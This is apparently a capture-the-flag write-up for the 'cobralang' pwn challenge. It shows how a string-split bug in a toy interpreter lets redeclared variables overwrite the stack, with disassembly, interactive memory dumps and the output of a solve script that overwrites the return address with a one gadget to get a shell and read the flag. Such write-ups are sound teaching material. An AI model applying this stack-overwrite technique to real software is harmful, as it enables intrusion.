# Solution

This interactive language supports only string types in a weird way. There are numerous bugs in code, but most importantly one has to focus on two things:
- the way `split(c)` works
- what happens then variable is declared (or redeclared)

## (Re)declaration of variables

In both disassembly and interactively, one can notice that declaration of variables happens by allocating content on the stack and storing it in `vars`:
```
00402738 8b 45 b0        MOV        EAX,dword ptr [RBP + local_58]
0040273b 83 f8 01        CMP        EAX,0x1
0040273e 74 0e           JZ         LAB_0040274e
...
004027ab 48 39 d4        CMP        RSP,RDX
004027ae 74 12           JZ         LAB_004027c2
004027b0 48 81 ec        SUB        RSP,0x1000
         00 10 00 00
```

Storing of this allocated memory inside `vars` can be seen in the `op_decl(long param1)` disassembly. Interactively:
```
>>> a = "1234"
>>> var_dump
[0] -> (4/40) a = '1234'
[1] -> (0/0)  = ''
[2] -> (0/0)  = ''
[3] -> (0/0)  = ''
[4] -> (0/0)  = ''
[5] -> (0/0)  = ''
[6] -> (0/0)  = ''
[7] -> (0/0)  = ''
[8] -> (0/0)  = ''
[9] -> (0/0)  = ''
[10] -> (0/0)  = ''
[11] -> (0/0)  = ''
[12] -> (0/0)  = ''
[13] -> (0/0)  = ''
[14] -> (0/0)  = ''
[15] -> (0/0)  = ''
>>> a = "12"
>>> var_dump
[0] -> (2/40) a = '12'
[1] -> (0/0)  = ''
[2] -> (0/0)  = ''
[3] -> (0/0)  = ''
[4] -> (0/0)  = ''
[5] -> (0/0)  = ''
[6] -> (0/0)  = ''
[7] -> (0/0)  = ''
[8] -> (0/0)  = ''
[9] -> (0/0)  = ''
[10] -> (0/0)  = ''
[11] -> (0/0)  = ''
[12] -> (0/0)  = ''
[13] -> (0/0)  = ''
[14] -> (0/0)  = ''
[15] -> (0/0)  = ''
>>> 
```

When the variable is redeclared, the same stack space is used that was allocated initially for that variable. This proves tricky later in combination with `split`.

## Splitting strings

When string is split, a new variable is created out of the second part of the string being split. The address of the content is reusing the same stack space (!) and size and capacity is recalculated:
```
*(long *)(vars + (long)vars_content_idx * 0x18 + 0x10) =
     *(long *)(vars + (long)*(int *)(param_1 + 8) * 0x18 + 0x10) + (long)char_idx + 1;
char_idx_as_char = (char)char_idx;
vars[(long)vars_content_idx * 0x18 + 1] = '(' - char_idx_as_char;
vars[(long)vars_content_idx * 0x18] =
     (vars[(long)*(int *)(param_1 + 8) * 0x18] - char_idx_as_char) + -1;
vars[(long)*(int *)(param_1 + 8) * 0x18] = char_idx_as_char;
memset((void *)((long)char_idx +
               *(long *)(vars + (long)*(int *)(param_1 + 8) * 0x18 + 0x10)),0,1);
```

This is also seen interactively:
```
>>> a = "split_me_1_split_me"
>>> a.split(1)
>>> var_dump
[0] -> (9/9) a = 'split_me_'
[1] -> (9/31) a0 = '_split_me'
[2] -> (0/0)  = ''
[3] -> (0/0)  = ''
[4] -> (0/0)  = ''
[5] -> (0/0)  = ''
[6] -> (0/0)  = ''
[7] -> (0/0)  = ''
[8] -> (0/0)  = ''
[9] -> (0/0)  = ''
[10] -> (0/0)  = ''
[11] -> (0/0)  = ''
[12] -> (0/0)  = ''
[13] -> (0/0)  = ''
[14] -> (0/0)  = ''
[15] -> (0/0)  = ''
```

We see that the second part of the string `a0` has less capacity of 31 and first part a capacity of 9. This is due to reuse of the same space as `a`. Combining this with redeclaration of variable `a` results in overwriting `a0`'s content:
```
>>> a = "OVERWRITING a0 CONTENT"    
>>> var_dump
[0] -> (22/40) a = 'OVERWRITING a0 CONTENT'
[1] -> (9/31) a0 = 'G a0 CONT'
[2] -> (0/0)  = ''
[3] -> (0/0)  = ''
[4] -> (0/0)  = ''
[5] -> (0/0)  = ''
[6] -> (0/0)  = ''
[7] -> (0/0)  = ''
[8] -> (0/0)  = ''
[9] -> (0/0)  = ''
[10] -> (0/0)  = ''
[11] -> (0/0)  = ''
[12] -> (0/0)  = ''
[13] -> (0/0)  = ''
[14] -> (0/0)  = ''
[15] -> (0/0)  = ''
```

This would mean that if we redeclare `a0`, we would overwrite into stack memory that is considered out-of-bounds for that string and eventually touch stored RBP and RIP registers.

## Crafting exploit

In order to reach stored register values, we can try to write full 40-byte string variables and split them at the end after which a second variable is created pointing to the end of the initial string. The second variable is again redeclared to a full 40-byte string variable and split until we get to the memory area where register values are stored.

There is one additional detail that one must have in mind, after few iterations of the aformentioned technique, the size of the variable will end up being larger than 40 bytes meaning that we can split by characters that follows after. With careful interactive testing, one should observe that variable name is what follows after 40-byte string value:
```
>>> var_name = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN"
>>> var_dump
[0] -> (48/40) var_name = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNvar_name'
[1] -> (0/0)  = ''
[2] -> (0/0)  = ''
[3] -> (0/0)  = ''
[4] -> (0/0)  = ''
[5] -> (0/0)  = ''
[6] -> (0/0)  = ''
[7] -> (0/0)  = ''
[8] -> (0/0)  = ''
[9] -> (0/0)  = ''
[10] -> (0/0)  = ''
[11] -> (0/0)  = ''
[12] -> (0/0)  = ''
[13] -> (0/0)  = ''
[14] -> (0/0)  = ''
[15] -> (0/0)  = ''
```

Here are a few iterations that demonstrate a segfault (middle removed for brevity):
```
>>> a = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN"
>>> a.split(M)
>>> var_dump
[0] -> (38/38) a = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKL'
[1] -> (2/2) a0 = 'Na'
[2] -> (0/0)  = ''
[3] -> (0/0)  = ''
[4] -> (0/0)  = ''
[5] -> (0/0)  = ''
[6] -> (0/0)  = ''
[7] -> (0/0)  = ''
[8] -> (0/0)  = ''
[9] -> (0/0)  = ''
[10] -> (0/0)  = ''
[11] -> (0/0)  = ''
[12] -> (0/0)  = ''
[13] -> (0/0)  = ''
[14] -> (0/0)  = ''
[15] -> (0/0)  = ''
>>> a0 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN"
>>> a.split(M)
no occurence of M found in a
>>> var_dump
[0] -> (38/38) a = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKL'
[1] -> (42/40) a0 = 'abcdefghi\x02\x00\x00\x00\x06\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x90\u\x11\x04\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
[2] -> (0/0)  = ''
[3] -> (0/0)  = ''
[4] -> (0/0)  = ''
[5] -> (0/0)  = ''
[6] -> (0/0)  = ''
[7] -> (0/0)  = ''
[8] -> (0/0)  = ''
[9] -> (0/0)  = ''
[10] -> (0/0)  = ''
[11] -> (0/0)  = ''
[12] -> (0/0)  = ''
[13] -> (0/0)  = ''
[14] -> (0/0)  = ''
[15] -> (0/0)  = ''
>>> a0.split(i)
>>> var_dump
...
>>> a0000 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN"
>>> var_dump
[0] -> (38/38) a = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKL'
[1] -> (8/8) a0 = 'abcdefgh'
[2] -> (24/24) a00 = '\x02\x00\x00\x00\x06\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x90\u\x11\x04\x7f\x00\x00'
[3] -> (40/40) a000 = '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
[4] -> (45/40) a0000 = 'ar_dump\x00\x00\x00\x00\x00\x00\x00opqrstuvwxyzABCDEFGHIJKLMNa0000'
[5] -> (0/0)  = ''
[6] -> (0/0)  = ''
[7] -> (0/0)  = ''
[8] -> (0/0)  = ''
[9] -> (0/0)  = ''
[10] -> (0/0)  = ''
[11] -> (0/0)  = ''
[12] -> (0/0)  = ''
[13] -> (0/0)  = ''
[14] -> (0/0)  = ''
[15] -> (0/0)  = ''
>>> quit
Segmentation fault (core dumped)
```

To get the flag, one must calculate the number of iterations needed and the appropriate offset after which the RIP value is simply overriden with a one gadget:
```
$ python3 solve.py 
[+] Opening connection to 172.17.0.2 on port 9000: Done
[*] '/home/vm/Documents/ib-ctf-2023/pwn/cobralang/attachments/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Switching to interactive mode
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag.txt
ibctf{y0u_4r3-4-d1z3As3-4nd_1_4m-TH3_kur33e}
```
